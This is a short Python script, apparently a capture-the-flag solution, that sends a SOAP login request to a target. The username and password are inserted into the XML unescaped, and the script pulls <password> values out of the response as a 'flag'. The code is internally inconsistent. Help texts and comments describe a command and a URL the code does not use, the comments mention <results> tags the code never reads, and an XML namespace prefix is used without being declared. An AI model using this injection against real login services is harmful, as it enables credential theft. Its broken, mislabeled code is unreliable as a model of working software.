import requests
import argparse
import re

# Set up argument parsing to accept a command (cmd) argument
parser = argparse.ArgumentParser(description="Execute a command via SOAP and extract the result.")
parser.add_argument("-u", "--username", help="Command to execute on the target", required=True)
parser.add_argument("-p", "--passwd", help="Enter url of target", required=True)
parser.add_argument("-i", "--ip", help="Enter url of target", required=True)
args = parser.parse_args()

# Define the SOAP payload with the command as an argument
payload = f"""
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><tem:username>{args.username}</tem:username><tem:password>{args.passwd}</tem:password></LoginRequest></soap:Body></soap:Envelope>
"""

# Send the SOAP request to the target URL
response = requests.post(
    args.ip,
    data=payload,
    headers={"SOAPAction": '"Login"'}
)

print(response.text)

# Extract and print the content between <results> tags
results = re.findall(r'<password>(.*?)</password>', response.text, re.DOTALL)

if results:
    for result in results:
        print("\nFlag found:", result.strip())
else:
    print("No results found in the response.")



